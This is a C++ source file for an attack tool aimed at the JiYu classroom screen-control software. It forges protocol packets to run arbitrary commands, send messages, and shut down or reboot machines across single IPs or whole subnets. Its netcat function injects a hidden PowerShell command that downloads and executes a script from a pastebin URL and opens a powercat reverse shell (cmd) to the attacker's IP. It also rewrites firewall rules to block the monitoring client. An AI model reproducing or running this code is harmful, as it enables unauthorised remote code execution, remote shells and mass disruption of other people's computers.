#include "JiYu_Attack.h"

#include <windows.h>
#include <vector>
#include <string>
#include <regex>
#include "JiYuAtk_lib.h"
#include "Logger.h"
#include "ISocket.h"

#ifdef _MSC_VER
#pragma warning(disable:4530)
#endif // _MSC_VER

JiYu_Attack::JiYu_Attack() {
    logger = new Logger(stdout, Logger::Error);
    client = new ISocket(logger);
    logger->log(Logger::Info, "JiYu_Attack initialized.");
}

const std::vector<BYTE> JiYu_Attack::cmdCodePrefix[4] = {
    std::vector<BYTE>{
        0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 0x9e, 0x03, 0x00, 0x00, 0x10, 0x41, 0xaf, 0xfb,
        0xa0, 0xe7, 0x52, 0x40, 0x91, 0xdc, 0x27, 0xa3, 0xb6, 0xf9, 0x29, 0x2e, 0x20, 0x4e, 0x00, 0x00,
        0xc0, 0xa8, 0x50, 0x81, 0x91, 0x03, 0x00, 0x00, 0x91, 0x03, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x05,
    }, std::vector<BYTE>{
        0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 0x6e, 0x03, 0x00, 0x00, 0x5b, 0x68, 0x2b, 0x25,
        0x6f, 0x61, 0x64, 0x4d, 0xa7, 0x92, 0xf0, 0x47, 0x00, 0xc5, 0xa4, 0x0e, 0x20, 0x4e, 0x00, 0x00,
        0xc0, 0xa8, 0x64, 0x86, 0x61, 0x03, 0x00, 0x00, 0x61, 0x03, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x43, 0x00, 0x3a, 0x00,
        0x5c, 0x00, 0x57, 0x00, 0x69, 0x00, 0x6e, 0x00, 0x64, 0x00, 0x6f, 0x00, 0x77, 0x00, 0x73, 0x00,
        0x5c, 0x00, 0x73, 0x00, 0x79, 0x00, 0x73, 0x00, 0x74, 0x00, 0x65, 0x00, 0x6d, 0x00, 0x33, 0x00,
        0x32, 0x00, 0x5c, 0x00, 0x63, 0x00, 0x6d, 0x00, 0x64, 0x00, 0x2e, 0x00, 0x65, 0x00, 0x78,
    }, std::vector<BYTE>{
        0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 0x2a, 0x02, 0x00, 0x00, 0xbf, 0x40, 0x22, 0x4e,
        0x57, 0x2d, 0x3e, 0x4f, 0x9b, 0x6f, 0xc1, 0x8d, 0xe1, 0xeb, 0x4f, 0x62, 0x20, 0x4e, 0x00, 0x00,
        0xc0, 0xa8, 0x50, 0x81, 0x1d, 0x02, 0x00, 0x00, 0x1d, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x13, 0x00, 0x00, 0x10, 0x0f, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x59, 0x65, 0x08, 0x5e, 0x06, 0x5c, 0xcd, 0x91, 0x2f, 0x54, 0xa8, 0x60,
        0x84, 0x76, 0xa1, 0x8b, 0x97, 0x7b, 0x3a, 0x67, 0x02, 0x30,
    }, std::vector<BYTE>{
        0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 0x2a, 0x02, 0x00, 0x00, 0xc8, 0xe3, 0x97, 0xfd,
        0xc0, 0xb5, 0x9f, 0x45, 0x87, 0x72, 0x05, 0xbd, 0x4e, 0x46, 0xa8, 0x96, 0x20, 0x4e, 0x00, 0x00,
        0xc0, 0xa8, 0x50, 0x81, 0x1d, 0x02, 0x00, 0x00, 0x1d, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x10, 0x0f, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x59, 0x65, 0x08, 0x5e, 0x06, 0x5c, 0x73, 0x51, 0xed, 0x95, 0xa8, 0x60,
        0x84, 0x76, 0xa1, 0x8b, 0x97, 0x7b, 0x3a, 0x67, 0x02, 0x30,
    },
};

const int JiYu_Attack::cmdContentBegin[2] = {56, 578};

const std::string JiYu_Attack::nc_ps_url = "https://pastebin.com/raw/u7zARPaN";

std::vector<std::string> JiYu_Attack::IPParser(std::string rawIP) {
    std::vector<std::string> ret;
    std::regex pattern("^((0|([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-4]))\\.){3}(([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-4]))$");
    if(std::regex_match(rawIP, pattern)) {
        logger->log(Logger::Info, "IP parsed. Type: origin.");
        ret.push_back(rawIP);
        return ret;
    }
    pattern = std::regex("^((0|([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-4]))\\.){3}(([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-4]))-(([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-4]))$");
    if(std::regex_match(rawIP, pattern)) {
        logger->log(Logger::Info, "IP parsed. Type: '-' segment.");
        std::string segPrefix = rawIP.substr(0, rawIP.rfind('.') + 1);
        std::string lStr = rawIP.substr(rawIP.rfind('.') + 1, rawIP.find('-') - rawIP.rfind('.') - 1);
        std::string rStr = rawIP.substr(rawIP.find('-') + 1);
        int l = strToInt(lStr), r = strToInt(rStr);
        for(int i = l; i <= r; i++) {
            ret.push_back(segPrefix + std::to_string(i));
        }
        return ret;
    }
    pattern = std::regex("^((0|([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-4]))\\.){3}(0|([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-5]))/24$");
    if(std::regex_match(rawIP, pattern)) {
        logger->log(Logger::Info, "IP parsed. Type: class C.");
        std::string segPrefix = rawIP.substr(0, rawIP.rfind('.') + 1);
        for(int i = 1; i < 255; i++) {
            ret.push_back(segPrefix + std::to_string(i));
        }
        return ret;
    }
    logger->log(Logger::Error, "非法的 IP 地址格式。");
    return ret;
}

int JiYu_Attack::sendCmd(std::string rawIP, int port, std::string cmd) {
    auto data = cmdCodePrefix[CMD];
    data.resize(897);
    data[572] = 0x2f; data[574] = 0x63; data[576] = 0x20;
    data[892] = 0x01; data[896] = 0x01; data[112] = 0x65;
    auto formatted = formatANSIString(cmd);
    data.resize((std::max)(data.size(), formatted.size() + cmdContentBegin[CMD]));
    for(int i = 0; i < (int)formatted.size(); i++) {
        data[i + cmdContentBegin[CMD]] = formatted[i];
    }
    return sendPkg(rawIP, port, data);
}

int JiYu_Attack::sendMsg(std::string rawIP, int port, std::string msg) {
    auto data = cmdCodePrefix[MSG];
    auto formatted = formatANSIString(msg);
    data.resize((std::max)(data.size(), formatted.size() + cmdContentBegin[MSG]));
    for(int i = 0; i < (int)formatted.size(); i++) {
        data[i + cmdContentBegin[MSG]] = formatted[i];
    }
    return sendPkg(rawIP, port, data);
}

int JiYu_Attack::sendShutdown(std::string rawIP, int port) {
    return sendPkg(rawIP, port, cmdCodePrefix[SHUTDOWN]);
}

int JiYu_Attack::sendReboot(std::string rawIP, int port) {
    return sendPkg(rawIP, port, cmdCodePrefix[REBOOT]);
}

DWORD WINAPI netcat_remote(LPVOID lpParameter) {
    NetcatInfo ncInfo = *(NetcatInfo*)lpParameter;
    return ncInfo.jyAtk->sendCmd(
        ncInfo.IP,
        ncInfo.port,
        "powershell -WindowStyle Hidden IEX (New-Object System.Net.Webclient).DownloadString('" + JiYu_Attack::nc_ps_url +
        "');powercat -c " + ncInfo.jyAtk->client->localIP + " -p " + std::to_string(ncInfo.ncport) + " -e cmd"
    );
}

int JiYu_Attack::netcat(std::string IP, int port, int ncport) {
    std::regex pattern("^((0|([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-4]))\\.){3}(([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-4]))$");
    if(!std::regex_match(IP, pattern)) {
        return 4;
    }
    NetcatInfo ncInfo = {this, IP, port, ncport};
    HANDLE hThread = CreateThread(NULL, 0, netcat_remote, &ncInfo, 0, NULL);
    printf("正在监听 %d 端口的 netcat……\n", ncport);
    system((
        "powershell IEX (New-Object System.Net.Webclient).DownloadString('" + nc_ps_url +
        "');powercat -l -p " + std::to_string(ncport)
    ).c_str());
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    return 0;
}

int JiYu_Attack::breakScreenControl() {
    if(system("net session >nul 2>&1")) {
        logger->log(Logger::Error, "需要管理员权限。");
        return 3;
    }
    system("sc config MpsSvc start=auto >nul 2>&1");
    system("net start MpsSvc >nul 2>&1");
    system("netsh advfirewall set allprofiles state on >nul 2>&1");
    system("netsh advfirewall firewall delete rule name=\"StudentMain.exe\" >nul 2>&1");
    system("netsh advfirewall firewall add rule name=\"StudentMain.exe\" dir=in action=block >nul 2>&1");
    return 0;
}

int JiYu_Attack::continueScreenControl() {
    if(system("net session >nul 2>&1")) {
        logger->log(Logger::Error, "需要管理员权限。");
        return 3;
    }
    system("netsh advfirewall firewall delete rule name=\"StudentMain.exe\" >nul 2>&1");
    system("netsh advfirewall firewall add rule name=\"StudentMain.exe\" dir=in action=allow >nul 2>&1");
    return 0;
}

int JiYu_Attack::sendPkg(std::string rawIP, int port, std::vector<BYTE> data) {
    data[12] = rand() % 256;
    data.resize((std::max)((int)data.size(), 1024));
    auto IPs = IPParser(rawIP);
    if(IPs.empty()) return 4;
    logger->log(Logger::Info, "Sending data package with %d bytes to raw IP %s parsed into %d IPs...", (int)data.size(), rawIP.c_str(), (int)IPs.size());
    int ret = 0;
    for(auto IP: IPs) {
        ret |= client->send(IP, port, data);
    }
    return ret;
}
